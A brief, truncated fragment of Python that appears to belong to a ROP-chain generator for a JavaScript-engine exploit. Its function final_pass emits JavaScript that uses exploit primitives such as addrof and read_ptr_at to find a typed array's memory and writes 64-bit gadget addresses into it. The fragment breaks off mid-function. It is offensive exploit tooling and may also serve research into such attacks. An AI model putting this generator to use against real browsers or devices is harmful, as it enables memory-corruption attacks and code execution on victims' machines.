...
def final_pass(l, ls, gs):
    ...
    ans.insert(0, 'let ropchain_array = new Uint32Array(%d);'%(sp_offset // 4))
    ans.insert(1, 'let ropchain = read_ptr_at(addrof(ropchain_array)+0x10);')
    ans.insert(2, 'let ropchain_offset = 2;')
    ans.insert(3, '''\
function set_gadget(val) {
    ropchain_array[ropchain_offset++] = val;
    ropchain_array[ropchain_offset++] = val / 4294967296;
}
let set_gadgets = (e) => e.forEach(set_gadget);
function db(data) {
